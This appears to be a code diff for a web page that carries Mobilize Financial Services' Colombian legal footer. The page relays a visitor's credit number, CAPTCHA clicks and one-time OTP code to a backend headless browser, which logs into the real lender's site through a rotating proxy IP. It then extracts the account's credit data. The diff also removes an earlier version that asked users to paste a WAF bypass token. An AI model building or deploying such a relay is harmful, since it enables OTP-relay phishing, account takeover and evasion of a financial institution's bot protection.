+    <p class="footer-legal">Los productos y servicios ofrecidos a través de MOBILIZE FINANCIAL SERVICES, son otorgados por RCI Colombia S.A Compañía de Financiamiento, entidad vigilada por la Superintendencia Financiera de Colombia</p>
+</footer>
+
+<script>
+const API = window.location.origin;
+let currentSessionId = null;
+
+function updateStepper(step) {
+    for (let i = 1; i <= 3; i++) {
+        const el = document.getElementById('stepItem' + i);
+        el.classList.remove('active', 'completed');
+        el.querySelector('.step-circle').textContent = i;
+        if (i < step) { el.classList.add('completed'); el.querySelector('.step-circle').textContent = '✓'; }
+        else if (i === step) el.classList.add('active');
+    }
+}
+
+function showStep(n) {
+    ['formStep1','formStep2','formStep3','formStepResult'].forEach(id =>
+        document.getElementById(id).classList.remove('visible'));
+    const map = { 1:'formStep1', 2:'formStep2', 3:'formStep3', 4:'formStepResult' };
+    if (map[n]) document.getElementById(map[n]).classList.add('visible');
+    updateStepper(Math.min(n, 3));
+}
+
+document.getElementById('creditNumber').addEventListener('input', function () {
+    const btn = document.getElementById('btnStart');
+    if (this.value.trim()) { btn.classList.add('active'); btn.disabled = false; }
+    else { btn.classList.remove('active'); btn.disabled = true; }
+});
+
+// 1. INICIAR — manda crédito, Puppeteer abre Mobilize con IP Geonode
+async function iniciarSesion() {
+    const credit = document.getElementById('creditNumber').value.trim();
+    if (!credit) return;
+    const btn = document.getElementById('btnStart');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span> Conectando con Mobilize...';
+    try {
+        const r = await fetch(API + '/api/start', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ creditNumber: credit }),
         });
-
-        liveIframe.addEventListener('error', showFallback);
-
-        // Timeout de seguridad
-        setTimeout(() => {
-            if (!iframeLoading.classList.contains('hidden')) {
-                showFallback();
-            }
-        }, 10000);
-
-        function showFallback() {
-            iframeLoading.classList.add('hidden');
-            document.getElementById('iframeBox').style.display = 'none';
-            document.getElementById('fallbackBox').classList.add('visible');
+        const data = await r.json();
+        if (!r.ok) throw new Error(data.error || 'Error al conectar');
+        currentSessionId = data.sessionId;
+        document.getElementById('liveScreenshot').src = data.screenshot;
+        showStep(2);
+        showMsg('', '');
+    } catch (err) {
+        showMsg(err.message, 'error');
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = 'CONTINUAR';
+        if (document.getElementById('creditNumber').value.trim()) {
+            btn.classList.add('active'); btn.disabled = false;
         }
+    }
+}
 
-        // ========== STEPPER ==========
-        function updateStepper(step) {
-            for (let i = 1; i <= 3; i++) {
-                const el = document.getElementById('stepItem' + i);
-                el.classList.remove('active', 'completed');
-                el.querySelector('.step-circle').textContent = i;
-                if (i < step) {
-                    el.classList.add('completed');
-                    el.querySelector('.step-circle').textContent = '✓';
-                } else if (i === step) {
-                    el.classList.add('active');
-                }
-            }
+// 2. CLICK en screenshot — usuario resuelve CAPTCHA real
+async function handleViewerClick(event) {
+    if (!currentSessionId) return;
+    const img = event.currentTarget.querySelector('img');
+    const rect = img.getBoundingClientRect();
+    const scaleX = 1366 / rect.width;
+    const scaleY = 768 / rect.height;
+    const x = Math.round((event.clientX - rect.left) * scaleX);
+    const y = Math.round((event.clientY - rect.top) * scaleY);
+
+    document.getElementById('viewerLoading').style.display = 'flex';
+    try {
+        const r = await fetch(API + '/api/click', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: currentSessionId, x, y }),
+        });
+        const data = await r.json();
+        if (!r.ok) throw new Error(data.error);
+        img.src = data.screenshot;
+    } catch (err) {
+        showMsg('Error: ' + err.message, 'error');
+    } finally {
+        document.getElementById('viewerLoading').style.display = 'none';
+    }
+}
+
+async function refreshScreenshot() {
+    if (!currentSessionId) return;
+    try {
+        const r = await fetch(API + '/api/screenshot', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: currentSessionId }),
+        });
+        const data = await r.json();
+        document.getElementById('liveScreenshot').src = data.screenshot;
+    } catch (err) { showMsg('Error: ' + err.message, 'error'); }
+}
+
+// Click en botón del sitio real (Continuar, Verificar, etc.)
+async function clickBotonSitio(texto) {
+    if (!currentSessionId) return;
+    const btn = document.getElementById('btnSubmitCaptcha');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span> Enviando...';
+    try {
+        const r = await fetch(API + '/api/click-button', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: currentSessionId, text: texto }),
+        });
+        const data = await r.json();
+        if (!r.ok) throw new Error(data.error);
+        document.getElementById('liveScreenshot').src = data.screenshot;
+
+        // Revisar si pasó al OTP
+        const ext = await fetch(API + '/api/extract', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: currentSessionId }),
+        });
+        const p = await ext.json();
+        const txt = (p.text || '').toLowerCase();
+        if (txt.includes('otp') || txt.includes('código') || txt.includes('code') || txt.includes('enviado')) {
+            showStep(3);
+            showMsg('Código enviado a tu celular o correo registrado.', 'info');
+        } else {
+            showMsg('Haz clic en las imágenes correctas y luego presiona ENVIAR.', 'info');
         }
+    } catch (err) { showMsg('Error: ' + err.message, 'error'); }
+    finally { btn.disabled = false; btn.innerHTML = 'ENVIAR VERIFICACIÓN'; }
+}
 
-        function showFormStep(step) {
-            ['formStep1','formStep2','formStep3','formStepResult'].forEach(id => {
-                document.getElementById(id).classList.remove('visible');
-            });
-            if (step === 1) document.getElementById('formStep1').classList.add('visible');
-            else if (step === 2) document.getElementById('formStep2').classList.add('visible');
-            else if (step === 3) document.getElementById('formStep3').classList.add('visible');
-            else if (step === 4) document.getElementById('formStepResult').classList.add('visible');
-            updateStepper(Math.min(step, 3));
-        }
+// 3. ENVIAR OTP al sitio real
+async function enviarOtp() {
+    const code = document.getElementById('otpCode').value.trim();
+    if (!code) return showMsg('Ingresa el código', 'error');
+    const btn = document.getElementById('btnVerify');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span>';
+    try {
+        // Escribir OTP en el sitio real
+        await fetch(API + '/api/type', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                sessionId: currentSessionId,
+                selector: 'input[formcontrolname="otp"], input[name="otp"], input[type="text"], input[maxlength="6"]',
+                text: code,
+            }),
+        });
+        // Click Verificar
+        await fetch(API + '/api/click-button', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: currentSessionId, text: 'verificar' }),
+        });
+        await new Promise(r => setTimeout(r, 3000));
 
-        // ========== OTP ==========
-        function selectOtpMethod(el, method) {
-            document.querySelectorAll('.otp-method').forEach(m => m.classList.remove('selected'));
-            el.classList.add('selected');
-            selectedOtpMethod = method;
-        }
+        // Extraer resultado final
+        const ext = await fetch(API + '/api/extract', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: currentSessionId }),
+        });
+        const pageData = await ext.json();
+        const ss = await fetch(API + '/api/screenshot', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: currentSessionId }),
+        });
+        const ssData = await ss.json();
 
-        // ========== TOKEN ==========
-        function getWafToken() {
-            if (wafToken) return wafToken;
-            const input = document.getElementById('wafTokenInput');
-            return input ? input.value.trim() : null;
-        }
+        document.getElementById('resultData').innerHTML =
+            '<div style="background:#f8f9fa;border-radius:10px;padding:20px;margin-bottom:15px">' +
+            '<h4 style="font-size:14px;color:#242833;margin-bottom:10px">Datos del crédito</h4>' +
+            '<pre style="white-space:pre-wrap;word-break:break-word;font-size:12px;font-family:Courier New,monospace">' +
+            esc(pageData.text || 'Sin datos') + '</pre></div>' +
+            '<img src="' + ssData.screenshot + '" style="width:100%;border-radius:10px;border:1px solid #eee">';
 
-        function updateContinueBtn() {
-            const credit = document.getElementById('creditNumber').value.trim();
-            const token = getWafToken();
-            const btn = document.getElementById('btnContinue');
-            if (credit && token) {
-                btn.classList.add('active');
-                btn.disabled = false;
-            } else {
-                btn.classList.remove('active');
-                btn.disabled = true;
-            }
-        }
+        showStep(4);
+        showMsg('', '');
+        fetch(API + '/api/close', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: currentSessionId }) });
+    } catch (err) { showMsg('Error: ' + err.message, 'error'); }
+    finally { btn.disabled = false; btn.innerHTML = 'VERIFICAR'; }
+}
 
-        // ========== API: Consultar crédito ==========
-        async function consultarCredito() {
-            const creditNumber = document.getElementById('creditNumber').value.trim();
-            const token = getWafToken();
+function resetAll() {
+    if (currentSessionId) fetch(API + '/api/close', { method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId: currentSessionId }) });
+    currentSessionId = null;
+    document.getElementById('creditNumber').value = '';
+    document.getElementById('otpCode').value = '';
+    document.getElementById('liveScreenshot').src = '';
+    showStep(1); showMsg('', '');
+    document.getElementById('btnStart').classList.remove('active');
+    document.getElementById('btnStart').disabled = true;
+}
 
-            if (!creditNumber) return showMsg('Ingresa el número de crédito', 'error');
-            if (!token) return showMsg('Resuelve el CAPTCHA y pega el token WAF', 'error');
+function showMsg(m, t) {
+    const el = document.getElementById('resultMsg');
+    if (!m) { el.innerHTML = ''; return; }
+    el.innerHTML = '<div class="result-box ' + t + '">' + m + '</div>';
+}
+function esc(t) { return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
-            const btn = document.getElementById('btnContinue');
-            btn.disabled = true;
-            btn.innerHTML = '<span class="spinner"></span> Consultando...';
-
-            try {
-                const resp = await fetch(`${API_BASE}/api/mobilize/credit-info`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ creditNumber, wafToken: token }),
-                });
-                const data = await resp.json();
-                if (!resp.ok) throw new Error(data.error || 'Error en la consulta');
-
-                wafToken = token;
-                document.getElementById('creditInfoCard').innerHTML =
-                    '<h4>Información del crédito</h4><pre>' + JSON.stringify(data, null, 2) + '</pre>';
-
-                showFormStep(2);
-                showMsg('', '');
-            } catch (err) {
-                showMsg(err.message, 'error');
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = 'CONTINUAR';
-                updateContinueBtn();
-            }
-        }
-
-        // ========== API: Solicitar OTP ==========
-        async function solicitarOtp() {
-            const creditNumber = document.getElementById('creditNumber').value.trim();
-            const token = getWafToken();
-            const btn = document.getElementById('btnOtp');
-
-            btn.disabled = true;
-            btn.innerHTML = '<span class="spinner"></span> Enviando código...';
-
-            try {
-                const resp = await fetch(`${API_BASE}/api/mobilize/otp/request`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ creditNumber, wafToken: token, medium: selectedOtpMethod }),
-                });
-                const data = await resp.json();
-                if (!resp.ok) throw new Error(data.error || 'Error enviando OTP');
-
-                document.getElementById('otpDestLabel').textContent =
-                    selectedOtpMethod === 'sms' ? 'celular' : 'correo electrónico';
-
-                showFormStep(3);
-                showMsg('Código enviado a tu ' + (selectedOtpMethod === 'sms' ? 'celular' : 'email') + '.', 'info');
-            } catch (err) {
-                showMsg(err.message, 'error');
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = 'ENVIAR CÓDIGO OTP';
-            }
-        }
-
-        // ========== API: Verificar OTP ==========
-        async function verificarOtp() {
-            const creditNumber = document.getElementById('creditNumber').value.trim();
-            const code = document.getElementById('otpCode').value.trim();
-            const token = getWafToken();
-            const btn = document.getElementById('btnVerifyOtp');
-
-            if (!code) return showMsg('Ingresa el código OTP', 'error');
-
-            btn.disabled = true;
-            btn.innerHTML = '<span class="spinner"></span>';
-
-            try {
-                const resp = await fetch(`${API_BASE}/api/mobilize/otp/verify`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ creditNumber, code, wafToken: token }),
-                });
-                const data = await resp.json();
-                if (!resp.ok) throw new Error(data.error || 'Código OTP inválido');
-
-                stepUpToken = data.token || data.stepUpToken || data.authToken || null;
-
-                document.getElementById('facturasMobilize').innerHTML =
-                    '<div class="credit-info-card"><h4>Datos del crédito</h4><pre>' +
-                    JSON.stringify(data, null, 2) + '</pre></div>';
-
-                showFormStep(4);
-                showMsg('', '');
-            } catch (err) {
-                showMsg(err.message, 'error');
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = 'VERIFICAR';
-            }
-        }
-
-        // ========== Reset ==========
-        function resetAll() {
-            document.getElementById('creditNumber').value = '';
-            document.getElementById('otpCode').value = '';
-            document.getElementById('wafTokenInput').value = '';
-            wafToken = null;
-            stepUpToken = null;
-            showFormStep(1);
-            showMsg('', '');
-            updateContinueBtn();
-        }
-
-        // ========== Helpers ==========
-        function showMsg(message, type) {
-            const el = document.getElementById('resultMsg');
-            if (!message) { el.innerHTML = ''; return; }
-            el.innerHTML = '<div class="result-box ' + type + '" style="margin-top:15px;">' + message + '</div>';
-        }
-    </script>
+// Auto-scroll al formulario en móvil apenas carga
+window.addEventListener('load', function() {
+    if (window.innerWidth <= 900) {
+        setTimeout(function() {
+            document.getElementById('formStep1').scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }, 300);
+    }
+});
+</script>
 </body>
 </html>
